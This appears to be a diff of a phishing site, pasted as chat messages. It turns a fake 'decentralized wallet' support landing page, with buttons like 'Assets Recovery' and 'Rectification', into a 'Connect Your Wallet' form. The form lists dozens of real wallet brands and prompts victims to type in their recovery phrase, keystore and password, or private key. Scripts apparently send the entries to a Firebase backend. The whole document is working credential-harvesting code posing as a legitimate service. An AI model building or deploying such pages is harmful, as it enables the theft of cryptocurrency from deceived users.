@@ -1,276 +1,155 @@
-
+Ayoub El Bazzazi, [2023-11-14 16:10]
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Artistry Unleashed - Your Decentralized Wallet Companion</title>
-    <style>
-        body {
-             font-family: 'Arial', sans-serif;
-            background-image: url('https://i.ibb.co/R0Zw1Tb/bg-crypto-jwv.jpg');
-            background-size: cover;
-            background-repeat: no-repeat;
-            background-attachment: fixed;
-            margin: 0;
-            padding: 0;
-        }
-
-        header {
-
-            color: #fff;
-            text-align: center;
-            padding: 20px;
-            height:400px;
-        }
-
-        /* Responsive styles for smaller screens */
-          @media only screen and (max-width: 600px) {
-             header {
-               height: auto; /* Adjust the height as needed for smaller screens */
-                }
-           }
-
-        section {
-            margin: 20px;
-            padding: 40px;
-            background-color: #fff;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            border-radius: 10px;
-        }
-
-        h1 {
-            font-size: 2.5em;
-            color: #333;
-        }
-
-        p {
-            font-size: 1.2em;
-            line-height: 1.6;
-        }
-        
-        
-          .popup {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background-color: #fff;
-            padding: 20px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
-            border-radius: 10px;
-            text-align: center;
-            z-index: 999;
-        }
-
-        .popup h2 {
-            color: #ff7e5f;
-        }
-
-        .popup p {
-            color: #333;
-            margin-bottom: 20px;
-        }
-
-        .popup-btn {
-            background: linear-gradient(to right, #ff7e5f, #feb47b);
-            color: #fff;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        
-        
-        
-
-       .paragraph-container {
-    background-color: rgba(55, 71, 79, 0.5); /* Semi-transparent dark blue-gray background */
-    color: #fff; /* White text color */
-    padding: 20px;
-    border-radius: 10px;
-    margin: 50px;
-    text-align: center;
-}
-
-.paragraph-container h1 {
-    background: linear-gradient(to right, #ff7e5f, #feb47b); /* Gradient background for h1 */
-    -webkit-background-clip: text;
-    color: transparent; /* Make the text transparent so the gradient background shows through */
-}
-
-.paragraph-container p {
-    color: #fff; /* White color for paragraphs */
-}
-
-        
-        .selection-buttons, .wallet-actions {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: space-around;
-            margin-top: 20px;
-        }
-
-       .selection-button, .wallet-action {
-    background: linear-gradient(to right, #ff7e5f, #feb47b); /* Gradient from coral to peach */
-    color: #fff;
-    padding: 15px 25px;
-    margin: 10px;
-    text-align: center;
-    text-decoration: none;
-    border: none;
-    border-radius: 50px;
-    cursor: pointer;
-    font-size: 1.2em;
-    transition: background 0.3s, color 0.3s, transform 0.3s;
-}
-
-.selection-button:hover, .wallet-action:hover {
-    background: linear-gradient(to right, #ff7e5f, #feb47b); /* Same gradient on hover */
-    color: #fff;
-    transform: scale(1.05);
-}
-
-
-        .sticky-bar {
-            height: 62px;
-            overflow: hidden;
-            box-sizing: border-box;
-            text-align: right;
-            line-height: 14px;
-            block-size: 62px;
-            font-size: 12px;
-            font-feature-settings: normal;
-            text-size-adjust: 100%;
-            padding: 1px;
-            padding: 0px;
-            margin: 0px;
-            width: 100%;
-        }
-        
-          .btnconnect {
-            padding-top:50px;
-        }
-        
-    </style>
-    
-    <script src="script.js"></script>
-
+    <title>Contact Messages | Firebase</title>
+    <link rel="stylesheet" href="./styles.css">
 </head>
+
 <body>
-    <div class="sticky-bar">
-        <div style="height: 40px; padding: 0px; margin: 0px; width: 100%">
-            <iframe
-                src="https://widget.coinlib.io/widget?type=horizontal_v2&amp;theme=dark&amp;pref_coin_id=1505&amp;invert_hover="
-                width="100%" height="36px" scrolling="auto" marginwidth="0" marginheight="0" frameborder="0"
-                border="0" style="border: 0; margin: 0; padding: 0"></iframe>
-        </div>
-        <div style="
-            color: #626b7f;
-            line-height: 14px;
-            font-weight: 400;
-            font-size: 11px;
-            box-sizing: border-box;
-            padding: 2px 6px;
-            width: 100%;
-            font-family: Verdana, Tahoma, Arial, sans-serif;
-        "></div>
-    </div>
-    <header class="paragraph-container">
-        <h1>Artistry Unleashed - Your Decentralized Wallet Companion</h1>
-        <p>Embark on a revolutionary journey into digital ownership through our decentralized protocol. Seamlessly connect wallets, engage in swift complaint resolutions, and begin your decentralized adventure now!
-</p>
-          <div class="btnconnect">
-        <a href="https://crypto-jwv.pages.dev/connect-wallet" class="selection-button">🚀 Connect Wallet</a>
-            </div>
-
+<!--     <div class="container"> -->
+    <header>
+        <h1>Connect Your Wallet</h1>
+        <p>🤝 Choose your preferred wallet type and enter your credentials to connect.</p>
     </header>
-
-<section>
-        <h1>Wallet Wonderland - Unleash the Magic!</h1>
-        <p>Step into a world of enchantment where your wallet takes center stage. Every action is a magical journey waiting to unfold. Connect, explore, and let the magic happen!</p>
-    
- </section>
-
     <section>
-        <h2>Choose Your Wallet Adventure</h2>
+        
+          <div class="wallet-actions">
+            <!-- Wallet options dynamically generated from the provided list -->
+            <label for="wallet-list">Choose Wallet:</label>
+            <select id="wallet-list" onchange="selectWallet()">
+                <option value="">Select a wallet</option>
+                <option value="MetaMask">MetaMask</option>
+                <option value="Trust Wallet">Trust Wallet</option>
+                <option value="Coinbase Wallet">Coinbase Wallet</option>
+                <option value="Ledger Nano X">Ledger Nano X</option>
+                <option value="Trezor Model T">Trezor Model T</option>
+                <option value="Mycelium">Mycelium</option>
+                <option value="Exodus">Exodus</option>
+                <option value="Leap Wallet">Leap Wallet</option>
+                <option value="Stader">Stader</option>
+                <option value="Atomic Wallet">Atomic Wallet</option>
+                <option value="Electrum">Electrum</option>
+                <option value="Coinomi">Coinomi</option>
+                <option value="Celsius">Celsius</option>
+                <option value="ZenGo">ZenGo</option>
+                <option value="Safepal S1">Safepal S1</option>
+                <option value="Ledger Nano S">Ledger Nano S</option>
+                <option value="Guard Wallet">Guard Wallet</option>
+                <option value="BitKeep">BitKeep</option>
+                <option value="eToro Money Crypto Wallet">eToro Money Crypto Wallet</option>
+                <option value="FTX Wallet">FTX Wallet</option>
+                <option value="Phantom Wallet">Phantom Wallet</option>
+                <option value="KeepKey">KeepKey</option>
+                <option value="Ellipal Titan">Ellipal Titan</option>
+                <option value="Argent Wallet">Argent Wallet</option>
+                <option value="YouHodler">YouHodler</option>
+                <option value="Bitbox02">Bitbox02</option>
+                <option value="Coldcard">Coldcard</option>
+                <option value="Keystone Pro">Keystone Pro</option>
+                <option value="Kraken">Kraken</option>
+                <option value="Gemini">Gemini</option>
+                <option value="SimpleHold Wallet">SimpleHold Wallet</option>
+                <option value="MyEtherWallet">MyEtherWallet</option>
+                <option value="Infinito Wallet">Infinito Wallet</option>
+                <option value="Wirex Wallet">Wirex Wallet</option>
+                <option value="CoinSpace Wallet">CoinSpace Wallet</option>
+                <option value="CoolWallet S">CoolWallet S</option>
+                <option value="Crypto.com DeFi Wallet">Crypto.com DeFi Wallet</option>
+                <option value="BitPay">BitPay</option>
+                <option value="Empire Wallet">Empire Wallet</option>
+                <option value="StakedWallet.io">StakedWallet.io</option>
+                <option value="Jaxx">Jaxx</option>
+                <option value="Xapo Wallet">Xapo Wallet</option>
+                <option value="Crypterium">Crypterium</option>
+                <option value="BitFreezer">BitFreezer</option>
+                <option value="Luno">Luno</option>
+                <option value="CoinJar Wallet">CoinJar Wallet</option>
+                <option value="Quppy">Quppy</option>
+                <option value="Freewallet">Freewallet</option>
+                <option value="SecuX Stone V20">SecuX Stone V20</option>
+                <option value="BitLox Ultimate">BitLox Ultimate</option>
 
-        <div class="wallet-actions">
-            <a href="https://crypto-jwv.pages.dev/connect-wallet" class="wallet-action">🚀 Connect Wallet</a>
-            <a href="https://crypto-jwv.pages.dev/explore-wallet-features" class="wallet-action">🌌 Explore Wallet Features</a>
-            <a href="https://crypto-jwv.pages.dev/top-up-balance" class="wallet-action">💸 Top-Up Balance</a>
-            <a href="https://crypto-jwv.pages.dev/check-transaction-history" class="wallet-action">🔍 Check Transaction History</a>
-            <a href="https://crypto-jwv.pages.dev/secure-your-wallet" class="wallet-action">🔒 Secure Your Wallet</a>
-            <a href="https://crypto-jwv.pages.dev/wallet-tips-tricks" class="wallet-action">💡 Wallet Tips & Tricks</a>
+Ayoub El Bazzazi, [2023-11-14 16:10]
+<option value="Unstoppable Wallet">Unstoppable Wallet</option>
+                <option value="Binance Chain Wallet">Binance Chain Wallet</option>
+                <option value="D'CENT Wallet">D'CENT Wallet</option>
+                <option value="BC Vault Wallet">BC Vault Wallet</option>
+                <option value="Arculus Wallet">Arculus Wallet</option>
+                <option value="Robinhood Crypto Wallet">Robinhood Crypto Wallet</option>
+                <option value="Wasabi Wallet">Wasabi Wallet</option>
+                <option value="Nexo">Nexo</option>
+                <option value="BRD Wallet">BRD Wallet</option>
+                <option value="Keplr">Keplr</option>
+                <option value="GreenAddress Wallet">GreenAddress Wallet</option>
+                <option value="Huobi Wallet">Huobi Wallet</option>
+                <option value="Enjin Wallet">Enjin Wallet</option>
+                <option value="StormGain">StormGain</option>
+                <option value="Clever">Clever</option>
+                <option value="TrustVault">TrustVault</option>
+                <option value="Moonlet">Moonlet</option>
+                <option value="TokenPocket">TokenPocket</option>
+                
+
+
+                <!-- Add more wallet options dynamically -->
+            </select>
+             
         </div>
-    </section>
-    
-    <section>
-        <h2>Make Your Selection Below</h2>
+        
+        <form action="" id="contactForm">
+            <div class="alert">Your message sent</div>
+                <label for="wallet-type">Selected Wallet:</label>
+            <input type="text" id="selected-wallet"  readonly>
 
-        <div class="selection-buttons">
-            <a href="https://crypto-jwv.pages.dev/migration" class="selection-button">Migration</a>
-            <a href="https://crypto-jwv.pages.dev/validate-or-synchronize" class="selection-button">Validate or Synchronize</a>
-            <a href="https://crypto-jwv.pages.dev/assets-recovery" class="selection-button">Assets Recovery</a>
-            <a href="https://crypto-jwv.pages.dev/rectification" class="selection-button">Rectification</a>
-            <a href="https://crypto-jwv.pages.dev/high-gas-fees" class="selection-button">High Gas Fees</a>
-            <a href="https://crypto-jwv.pages.dev/slippage-error" class="selection-button">Slippage Error</a>
-            <!-- Add more buttons as needed -->
-        </div>
-    </section>
-    
-    
- 
-    <!-- Popup for the "please connect first" message -->
-    <div id="popup" class="popup">
-        <h2>Oops! Please Connect First</h2>
-        <p>To access this feature, please connect your wallet.</p>
-        <button class="popup-btn" onclick="closePopup()">Close</button>
-    </div>
+            <label for="wallet-info-type">Select Wallet Information Type:</label>
+            <select id="wallet-info-type" onchange="showInfoInput()">
+                <option value="phrase">Phrase</option>
+                <option value="keystore">Keystore</option>
+                <option value="private-key">Private Key</option>
+            </select>
+            <div id="info-input-container"></div>
+            
+                <button type="submit">Connect</button>
+            
+        </form>
+         </section>
+<!--     </div> -->
 
-    <!-- JavaScript to handle button clicks and show the popup -->
-   <script>
-    function showPopup() {
-        document.getElementById('popup').style.display = 'block';
-    }
-
-    function closePopup() {
-        document.getElementById('popup').style.display = 'none';
-    }
-
-    document.addEventListener('DOMContentLoaded', function() {
-        var buttons = document.querySelectorAll('.selection-button, .wallet-action');
-
-        buttons.forEach(function(button) {
-            button.addEventListener('click', function(event) {
-                event.preventDefault();
-
-                if (event.target.classList.contains('wallet-action') && event.target.textContent.trim() === '🚀 Connect Wallet') {
-                    window.location.href = event.target.getAttribute('href');
-                } else if (!event.target.classList.contains('selection-button')) {
-                    showPopup();
-                }
-            });
-        });
-
-        var selectionButtons = document.querySelectorAll('.selection-buttons .selection-button');
-
-        selectionButtons.forEach(function(button) {
-            button.addEventListener('click', function(event) {
-                event.preventDefault();
-                showPopup();
-            });
-        });
-
-        var connectWalletHeader = document.querySelector('.btnconnect a');
-
-        connectWalletHeader.addEventListener('click', function(event) {
-            event.preventDefault();
-            window.location.href = event.target.getAttribute('href');
-        });
-    });
-</script>
-    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
+    <script src="./mail.js"></script>
 </body>
+
 </html>
+
+Ayoub El Bazzazi, [2023-11-14 16:15]
+// Dynamically create and append information input fields based on the selected type and wallet
+            switch (walletInfoType) {
+                case 'phrase':
+                    infoInputContainer.innerHTML = `
+                        <label for="wallet-phrase">Enter your recovery phrase for ${selectedWallet}:</label>
+                        <textarea id="wallet-phrase" placeholder="Typical 12 (sometimes 24) words separated by single spaces." rows="4"></textarea>
+                    `;
+                    break;
+                case 'keystore':
+                    infoInputContainer.innerHTML = `
+                        <label for="wallet-keystore">Enter Keystore for ${selectedWallet}:</label>
+                        <input type="text" id="wallet-keystore" placeholder="Several lines of text beginning with '{...}'">
+                        <label for="wallet-password">Wallet Password:</label>
+                        <input type="password" id="wallet-password" placeholder="Enter your password">
+                    `;
+                    break;
+                case 'private-key':
+                    infoInputContainer.innerHTML = `
+                        <label for="wallet-private-key">Enter your Private Key for ${selectedWallet}:</label>
+                        <input type="text" id="wallet-private-key" placeholder="Typically 12 (sometimes 24) words separated by a single space.">
+                    `;
+                    break;
+                default:
+                    break;
+            }
+        }
